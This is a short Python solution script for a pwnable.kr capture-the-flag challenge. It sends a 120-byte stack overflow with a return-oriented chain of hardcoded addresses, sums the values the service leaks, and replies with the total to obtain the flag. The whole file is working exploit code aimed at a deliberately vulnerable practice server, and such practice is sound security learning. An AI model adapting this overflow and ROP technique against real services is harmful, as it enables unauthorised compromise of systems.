import socket
import re
exp = 0
exp_re = re.compile(r"EXP \+(.+)\)")

def get_data():
    global exp
    data = s.recv(1024).decode()
    if len(exp_re.findall(data)) > 0:
        for i in exp_re.findall(data):
            exp += int(i)
    print(data)

def write_data(payload):
    s.send(payload + "\n".encode())

def addr_conv(input):
    return input.to_bytes(4, "little")

s = socket.socket()
s.connect(("pwnable.kr", 9032))

syscall_open = 0x0809fcc0
syscall_read = 0x0809fc30
syscall_write = 0x0809fca0
flag_path = 0x0809053c
func_a = 0x0809fe4b
func_b = 0x0809fe6a
func_c = 0x0809fe89
func_d = 0x0809fea8
func_e = 0x0809fec7
func_f = 0x0809fee6
func_g = 0x0809ff05
func_ropme = 0x0809fffc
get_data()
get_data()
payload = b"1"
write_data(payload)
#payload = b"B" * 120 + addr_conv(syscall_open) + addr_conv(syscall_read) + addr_conv(flag_path)
payload = b"B" * 120 + addr_conv(func_a) + addr_conv(func_b) + addr_conv(func_c) + addr_conv(func_d) \
          + addr_conv(func_e) + addr_conv(func_f) + addr_conv(func_g) + addr_conv(func_ropme)
write_data(payload)

get_data()
get_data()
payload = b"1"
write_data(payload)
print("REG:" + str(exp))
print("REG:" + hex(exp))
print("NEG:" + str(exp % 0xFFFFFFFF + 1))

payload = b"1"
if exp > 0:
    payload = str(exp).encode()
else:
    payload = str(exp % 0xFFFFFFFF + 1).encode()
write_data(payload)
get_data()
get_data()
get_data()